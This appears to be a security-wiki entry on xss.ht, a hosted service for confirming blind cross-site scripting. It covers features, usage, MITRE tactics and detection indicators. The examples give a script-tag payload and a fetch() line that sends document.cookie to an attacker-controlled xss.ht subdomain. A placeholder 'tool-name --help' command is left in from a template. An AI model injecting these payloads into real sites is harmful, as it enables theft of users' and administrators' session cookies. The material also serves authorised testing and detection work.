---
url: 'https://xss.ht'
tags:
  - xss
  - detection
  - blind-xss
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.944Z'
id: 137a0c2f-bd13-41e7-bbcf-8911aef1d291
validated: true
submitted: true
---
# xss-ht

**Status**: Unverified

## Overview

xss.ht is a free external service for detecting and verifying Blind XSS payloads by hosting script endpoints that log execution details, including requester IP, user-agent, and any exfiltrated data.

## Description

In offensive security testing, xss.ht is used to confirm Blind XSS vulnerabilities where execution isn't immediately visible to the attacker. Users create a subdomain (e.g., abhartiya.xss.ht) to host a simple script that captures and displays callback information when the payload triggers. It's particularly useful for stored or Blind XSS in admin panels, as in this Rockstar Games scenario, where admin review executes the payload.

## Features

- Feature 1: Instant subdomain creation for payload hosting
- Feature 2: Real-time logging of execution requests with headers and payloads
- Feature 3: No setup required; web-based interface for viewing hits

## Installation

### Requirements

- Web browser for access
- No local installation needed

### Install Commands

No installation; access via https://xss.ht

## Basic Usage

```bash
tool-name --help
```

Visit https://xss.ht, create a subdomain, and use the generated URL in your payload.

### Common Options

| Option | Description |
|--------|-------------|
| N/A | Web-based; no CLI options |

## Examples

### Example 1: Basic Usage

Create subdomain at https://xss.ht and inject <script src=https://your-sub.xss.ht></script> in vulnerable input.

### Example 2: Advanced Usage

Customize payload to exfiltrate data: <script>fetch('https://your-sub.xss.ht?cookie='+document.cookie)</script>

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Archive Collected Data]]

### Tactics

- [[Collection]]
- [[Exfiltration]]

## Detection

Indicators and methods for detecting this tool's usage:

- Network traffic to xss.ht domains from internal systems
- Anomalous script loads in web logs from external XSS hosts

## Related Procedures

- [[procedures/Inject-Blind-XSS-Payload-into-Feedback-Form]]

## Related Tools

- [[BeeF Framework]]
- [[XSStrike]]

## References

- Official site: https://xss.ht
- Documentation: Integrated help on the site
